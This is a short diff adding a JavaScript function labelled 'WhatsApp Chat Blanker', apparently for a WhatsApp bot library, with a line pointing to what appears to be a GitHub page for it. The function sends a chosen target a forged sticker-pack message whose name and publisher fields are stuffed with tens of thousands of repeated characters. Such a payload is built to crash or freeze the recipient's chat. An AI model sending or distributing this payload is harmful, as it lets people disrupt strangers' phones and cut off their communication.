@@ -1,0 +1,33 @@
+.heryera.github.io/herysuhubug
+// WhatsApp Chat Blanker
+async function blanker(dick, target) {
+  await dick.relayMessage(target, {
+    stickerPackMessage: {
+      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
+      name: "ꦾ".repeat(70000),
+      publisher: "[RDVSP]" + "ꦾ".repeat(500),
+      stickers: [],
+      fileLength: "3662919",
+      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
+      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
+      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
+      directPath: "/stickerpack/blubblub.enc",
+      contextInfo: {
+        remoteJid: "X",
+        participant: "0@s.whatsapp.net",
+        mentionedJid: ["13135550202@s.whatsapp.net"]
+      },
+      packDescription: "",
+      mediaKeyTimestamp: "1747502082",
+      trayIconFileName: "x",
+      thumbnailDirectPath: "/stickerpack/blubblub.enc",
+      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
+      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
+      thumbnailHeight: 252,
+      thumbnailWidth: 252,
+      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
+      stickerPackSize: "3680054",
+      stickerPackOrigin: "USER_CREATED"
+    }
+  }, {});
+}
